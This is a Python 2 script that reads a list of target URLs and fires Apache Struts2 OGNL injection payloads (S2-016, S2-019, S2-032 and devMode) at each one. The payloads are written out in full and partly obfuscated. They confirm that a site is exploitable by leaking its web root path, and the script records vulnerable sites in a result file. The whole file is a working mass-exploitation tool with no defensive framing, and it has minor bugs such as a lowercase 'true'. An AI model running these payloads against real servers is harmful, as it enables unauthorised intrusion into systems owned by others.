#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import sys
 
def s2exp(url,types):
    s2_016payload = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path88888887:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}"
    s2_019payload = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path88888887:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()"
    s2_032payload = "method:%23_memberAccess%[email]3d@ognl.OgnlContext[/email]@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(88888888-1),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
    s2_devmode = "debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=88888887"
    if types == "032":
        payload = s2_032payload
    elif types == "016":
        payload = s2_016payload
    elif types == "s2_devmode":
        payload = s2_devmode
    else:
        payload = s2_019payload 
    try:
        headers = {"Content-types":"application/x-www-form-urlencoded"}
        r = requests.post(url,data=payload,headers=headers,timeout=5)
        res = r.text
        if res.find("88888887") <> -1:
            f = open("result.txt","a")
            f.write(l.strip()  + " [s2-" + types + "]\r\n\r\n")
            print "\n[+]%s vulnerability exits s2-%s!" % (l.strip(),types),
            return true
        else:
            print "\n[-]%s Not s2-%s vulnerability" % (url,types),
            return False
    except:
        print "\n[-]%s timeout" % url,
        return False
 
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print "Example: python exp.py list.txt"
        exit()
    weblist = sys.argv[1]
    f = open(weblist)
    for l in f.readlines():
        url = l.strip()
        s2exp(url,"032")
        s2exp(url,"016")
        s2exp(url,"019")
        s2exp(url,"s2_devmode")
